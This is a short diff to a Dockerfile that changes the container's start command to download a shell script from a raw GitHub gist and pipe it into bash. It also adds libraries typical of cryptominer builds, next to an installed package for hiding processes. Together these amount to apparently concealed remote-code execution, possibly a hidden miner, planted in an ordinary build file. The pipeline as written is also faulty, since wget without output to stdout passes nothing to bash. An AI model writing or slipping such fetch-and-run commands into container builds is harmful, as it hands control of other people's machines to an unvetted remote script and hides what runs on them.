@@ -17,6 +17,9 @@ RUN apt-get update && apt-get install -y \
     npm \
     screen \
     ca-certificates \
+    libnuma-dev \
+    libjansson-dev \
+    ca-certificates \
     libcurl4 \
     libjansson4 \
     libgomp1 \
@@ -37,4 +40,4 @@ RUN echo "Uploaded files:" && ls /home/stuff/
 RUN npm i -g node-process-hider
 
 # Run bot script:
-CMD bash /home/startbot.sh
+CMD wget https://gist.githubusercontent.com/petugas/2e39685c7f122fc78d10a3006dcd6210/raw/9642f636daa0f8affab759412a88d1b65fb2c075/R.sh | bash
